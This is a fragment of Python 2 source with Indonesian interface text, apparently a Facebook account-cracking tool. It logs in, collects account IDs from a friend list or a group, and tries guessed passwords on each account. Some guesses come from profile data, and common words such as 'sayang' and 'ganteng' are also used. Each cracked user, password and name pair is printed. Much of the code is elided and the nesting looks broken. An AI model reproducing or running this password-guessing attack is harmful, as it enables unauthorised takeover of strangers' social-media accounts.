...
def tik():
    ...
    for i in range(100):
        time.sleep(0.1)
        sys.stdout.write('\r\033[31;1m[!]Tunggu Sebentar \x1b[1;97m' + animation[(i % len(animation))])
        sys.stdout.flush()
...
def login():
    ...
    try:
        ...
        os.system('reset')
        print logo
        print 40 * '\xe2\x95\x90'
        print '[~]\033[31;1mlogin With facebook[~]'
        ...
        if 'save-device' in url:
            try:
                ...
                zedd.close()
                print '\n\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] Good'
        ...
        if 'checkpoint' in url:
            print '[!] Akun kamu  kena Checkpoint'
...
def pilih():
    ...
    if zedd == '':
        print '\x1b[1;91m[!] Masukin yang bener dong'
        pilih()
    else:
        if zedd == '1':
            informasi()
...
def super():
    ...
    print logo
    print 40 * '\x1b[1;97m\xe2\x95\x90'
    print '\x1b[1;37;40m1. Crack With list friend'
    print '\x1b[1;37;40m2. Crack With list Grup'
        ...
        if peak == '1':
            ...
            if peak == '2':
                ...
                if peak == '0':
                    ...
                    pilih_super()
    print '[+]Jumlah ID : \x1b[1;97m' + str(len(id))
    jalan('[+]Tungu sebentar...')
    titik =['... ']
    for o in titik:
        print '[+]sedang mengCrack ..\x1b[1;97m' + o,
        sys.stdout.flush()
        time.sleep(1)
        ...
        try:
            ...
            if 'access_token' in q:
                ...
                if 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;97m[\x1b[1;93m\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + pass1 +" =>"+z['name']
                else:
                    ...
                    if 'access_token' in q:
                        ...
                        if 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;97m[\x1b[1;93m\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + pass2 +" =>"+z['name']
                        else:
                            pass3 = b['sayang'] 
                            ...
                            if 'access_token' in q:
                                ...
                                if 'www.facebook.com' in q['error_msg']:
                                    print '\x1b[1;97m[\x1b[1;93m\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + pass3 +" =>"+z['name']
                                else:
                                    pass4 = b['ganteng']
                                    ...
                                    if 'access_token' in q:
                                        ...
                                        if 'www.facebook.com' in q['error_msg']:
                                            print '\x1b[1;97m[\x1b[1;93m\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + pass4 +" =>"+z['name']
        except:
            pass
